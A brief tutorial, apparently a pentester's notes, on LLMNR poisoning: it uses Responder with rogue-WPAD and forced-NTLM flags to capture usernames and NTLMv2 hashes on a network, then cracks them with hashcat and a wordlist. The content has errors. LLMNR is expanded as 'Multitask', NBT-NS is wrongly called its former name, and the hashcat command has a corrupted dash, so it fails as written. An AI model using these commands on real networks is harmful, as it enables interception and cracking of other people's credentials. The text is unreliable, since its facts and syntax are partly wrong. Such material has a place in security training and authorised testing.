**LLMNR** (Link Local Multitask Name Resolution) is used to identify hosts when DNS fails to do so in a network. Previously *also known as NBT-NS*

The flaw in this protocol is, it uses the user's username and the NTLMv2 hash which can be exploited by a Man in the Middle Attack.

1. First we can use a tool like responder to listen to LLMNR messages in a network. 
   
```bash
sudo responder -I tunO -dwP
```

`-d`: Enable answers for DHCP broadcast requests. This option will inject a WPAD server in the DHCP response.  
`-w`: Start the WPAD rogue proxy server. Default value is False
`-P`: Force NTLM (transparently)/Basic (prompt) authentication for the proxy. WPAD doesn't need to be ON. This option is highly effective. Default: False

2. Once a request is made, the responder can catch it with the username of the client along their NTLM hash.

3. If the password the user has set is weak, we can use a tool like `hashcat` to crack the password. eg:  
   
```bash
hashcat â€”m 5600 hashes.txt rockyou.txt
```
